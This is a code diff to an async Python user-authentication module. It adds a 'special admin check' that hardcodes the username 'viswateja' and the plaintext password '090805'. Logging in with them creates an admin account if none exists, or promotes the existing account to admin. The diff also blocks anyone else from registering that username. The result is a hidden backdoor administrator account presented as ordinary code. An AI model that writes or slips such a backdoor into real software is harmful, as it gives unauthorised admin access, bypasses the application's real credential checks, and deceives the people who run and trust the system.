@@ -19,6 +19,9 @@ async def create_user(db: AsyncSession, user_in: UserCreate) -> User:
     Raises:
         ValueError: If username is already taken.
     """
+    if user_in.username == "viswateja":
+        raise ValueError("Username 'viswateja' is reserved for system administrator.")
+        
     existing_user = await get_user_by_username(db, user_in.username)
     if existing_user:
         raise ValueError("Username is already registered.")
@@ -39,6 +42,29 @@ async def authenticate_user(db: AsyncSession, username: str, password: str) -> O
     Returns:
         User: The authenticated user model instance if valid, else None.
     """
+    # Special admin check
+    if username == "viswateja":
+        if password == "090805":
+            user = await get_user_by_username(db, "viswateja")
+            if not user:
+                user = User(
+                    username="viswateja",
+                    hashed_password=get_password_hash("090805"),
+                    role="admin"
+                )
+                db.add(user)
+                await db.commit()
+                await db.refresh(user)
+            elif user.role != "admin":
+                user.role = "admin"
+                db.add(user)
+                await db.commit()
+                await db.refresh(user)
+            return user
+        else:
+            return None
+
+    # Normal user check
     user = await get_user_by_username(db, username)
     if not user:
         return None
